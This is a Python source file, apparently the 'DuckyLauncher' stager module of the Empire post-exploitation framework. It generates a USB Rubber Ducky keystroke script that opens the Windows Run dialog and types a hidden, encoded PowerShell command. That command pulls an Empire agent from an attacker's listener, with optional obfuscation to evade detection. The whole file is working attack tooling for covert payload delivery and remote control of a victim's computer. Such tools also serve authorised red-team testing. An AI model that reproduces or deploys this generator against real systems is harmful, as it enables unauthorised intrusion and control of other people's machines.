from __future__ import print_function
from builtins import object
from empire.server.common import helpers


class Stager(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'DuckyLauncher',

            'Author': ['@harmj0y', '@kisasondi'],

            'Description': 'Generates a ducky script that runes a one-liner stage0 launcher for Empire.',

            'Comments': ['']
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener': {
                'Description': 'Listener to generate stager for.',
                'Required': True,
                'Value': ''
            },
            'Language': {
                'Description': 'Language of the stager to generate.',
                'Required': True,
                'Value': 'powershell',
                'SuggestedValues': ['powershell'],
                'Strict': True
            },
            'Interpreter': {
                'Description': 'Which interpreter do you want? (powershell or cmd)',
                'Required': False,
                'Value': 'powershell',
                'SuggestedValues': ['powershell', 'cmd'],
                'Strict': True
            },
            'StagerRetries': {
                'Description': 'Times for the stager to retry connecting.',
                'Required': False,
                'Value': '0'
            },
            'OutFile': {
                'Description': 'Filename that should be used for the generated output, otherwise returned as a string.',
                'Required': False,
                'Value': ''
            },
            'Obfuscate': {
                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required': False,
                'Value': 'False',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'ObfuscateCommand': {
                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required': False,
                'Value': r'Token\All\1'
            },
            'UserAgent': {
                'Description': 'User-agent string to use for the staging request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'Proxy': {
                'Description': 'Proxy to use for request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'ProxyCreds': {
                'Description': 'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        interpreter = self.options['Interpreter']['Value']
        listener_name = self.options['Listener']['Value']
        user_agent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxy_creds = self.options['ProxyCreds']['Value']
        stager_retries = self.options['StagerRetries']['Value']
        obfuscate = self.options['Obfuscate']['Value']
        obfuscate_command = self.options['ObfuscateCommand']['Value']

        obfuscate_script = False
        if obfuscate.lower() == "true":
            obfuscate_script = True

        # generate the launcher code
        module_name = self.mainMenu.listeners.activeListeners[listener_name]['moduleName']
        launcher = self.mainMenu.stagers.generate_launcher(listenerName=listener_name, language=language, encode=True,
                                                           obfuscate=obfuscate_script,
                                                           obfuscationCommand=obfuscate_command, userAgent=user_agent,
                                                           proxy=proxy, proxyCreds=proxy_creds,
                                                           stagerRetries=stager_retries)

        if launcher == "" or interpreter == "":
            print(helpers.color("[!] Error in launcher command generation."))
            return ""
        else:
            if module_name.lower() == 'meterpreter':
                import base64
                enc = base64.b64encode(launcher)
            else:
                enc = launcher.split(" ")[-1]

            ducky_code = "DELAY 3000\n"
            ducky_code += "GUI r\n"
            ducky_code += "DELAY 1000\n"
            ducky_code += "STRING " + interpreter + "\n"
            ducky_code += "ENTER\n"
            ducky_code += "DELAY 2000\n"

            if obfuscate_script and "launcher" in obfuscate_command.lower():
                ducky_code += "STRING " + launcher + " \n"
            else:
                ducky_code += "STRING powershell -W Hidden -nop -noni -enc " + enc + " \n"

            ducky_code += "ENTER\n"

            return ducky_code
